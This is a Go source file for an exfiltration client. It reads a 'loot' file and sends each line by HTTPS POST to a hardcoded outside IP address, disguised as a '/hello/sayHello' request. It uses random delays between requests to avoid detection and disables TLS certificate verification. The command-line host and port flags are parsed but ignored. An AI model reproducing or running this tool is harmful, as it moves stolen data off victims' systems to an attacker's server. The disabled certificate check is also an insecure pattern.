//client.go
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"time"

	"golang.org/x/net/http2"
)

func main() {

	// process command line args
	hostPtr := flag.String("host", "", "-host=\"127.0.0.1\"")
	portPtr := flag.String("port", "", "-port=\"8080\"")
	lootPtr := flag.String("infile", "loot.txt", "-infile=\"loot.txt\"")
	flag.Parse()

	if *hostPtr == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *portPtr == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	client := &http.Client{}

	// Create a pool with the server certificate since it is not signed
	// by a known CA
	caCert, err := ioutil.ReadFile("./cert/server.crt")
	if err != nil {
		log.Fatalf("Reading server certificate: %s", err)
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	// Create TLS configuration with the certificate of the server
	tlsConfig := &tls.Config{
		RootCAs:            caCertPool,
		InsecureSkipVerify: true,
	}

	// Use the proper transport in the client
	client.Transport = &http2.Transport{
		TLSClientConfig: tlsConfig,
	}

	s := "http://" + *hostPtr + ":" + *portPtr
	log.Printf("\n[*]\n[*]Parsing loot file: %s to uri: %s\n[*]\n", string(*lootPtr), string(s))

	// for ever read loot file
	// send loot file over to server
	file, err := os.Open(*lootPtr)
	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	file.Close()

	for _, eachline := range txtlines {
		// Perform the request
		resp, err := client.Post("https://206.128.153.183:12970/hello/sayHello", "text/plain", bytes.NewBufferString(eachline))
		if err != nil {
			log.Fatalf("Failed get: %s", err)
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("Failed reading response body: %s", err)
		}
		if resp.StatusCode == 200 {
			fmt.Printf("[*] %d %s\n", resp.StatusCode, resp.Proto)
		} else {
			fmt.Printf("[*] Response %d: %s %s", resp.StatusCode, resp.Proto, string(body))
		}
		time.Sleep(time.Duration(rand.Intn(5)) * time.Second)
	}
}
